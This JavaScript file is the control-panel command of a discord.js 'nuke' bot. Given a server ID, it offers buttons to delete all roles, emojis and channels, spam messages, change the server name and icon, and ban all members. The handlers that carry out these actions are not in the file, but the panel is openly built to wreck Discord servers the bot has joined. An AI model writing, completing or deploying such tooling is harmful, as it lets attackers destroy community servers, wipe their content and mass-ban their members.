const { CommandInteraction, ApplicationCommandType, SlashCommandBuilder, ApplicationCommandOptionType, ActionRowBuilder, ButtonBuilder, } = require("discord.js");
const BOT = require("../handlers/Client");

module.exports = {
  // options
  name: "controlpanel",
  description: "What you want nuke server id",
  type: ApplicationCommandType.ChatInput,
  options: [
    {
      required: true,
      autocomplete: true,
      name: 'guild-id',
      type: ApplicationCommandOptionType.String,
      description: 'What you want nuke server id'
      }
  ],
  cooldown: 10,
  // command start
  /**
   *
   * @param {BOT} client
   * @param {CommandInteraction} interaction
   */
  run: async (client, interaction) => {
    let option = String((interaction.options.get("guild-id")).value).replace(" ","")
    if(!client.guilds.cache.has(option))return interaction.followUp({content: "This server not found!"})
    
    let guild = await client.guilds.cache.get(option)
    
      return interaction.followUp({content: guild.name + " | 👹 Nuke Panel",components: [
        new ActionRowBuilder().addComponents(
          new ButtonBuilder()
          .setLabel("Delete All Roles")
          .setStyle("Primary")
          .setCustomId("deleteallroles_"+guild.id),
          new ButtonBuilder()
          .setLabel("Delete All Emojis")
          .setStyle("Primary")
          .setCustomId("deleteallemojis_"+guild.id),
          new ButtonBuilder()
          .setLabel("Delete All Channels")
          .setStyle("Primary")
          .setCustomId("deleteallchannels_"+guild.id)
        ),
        new ActionRowBuilder().addComponents(
          new ButtonBuilder()
          .setLabel("Channel&Message Spam / The bot can be banned by the server owner!")
          .setStyle("Primary")
          .setCustomId("spam_"+guild.id),
        ),
        new ActionRowBuilder().addComponents(
          new ButtonBuilder()
          .setLabel("Change Server Name")
          .setStyle("Primary")
          .setCustomId("changename_"+guild.id),
          new ButtonBuilder()
          .setLabel("Change Server İcon")
          .setStyle("Primary")
          .setCustomId("changeicon_"+guild.id)
        ),
        new ActionRowBuilder().addComponents(
          new ButtonBuilder()
          .setLabel("Ban All Members")
          .setStyle("Danger")
          .setCustomId("banmembers_"+guild.id),)
      ]})
    
     
  },
};
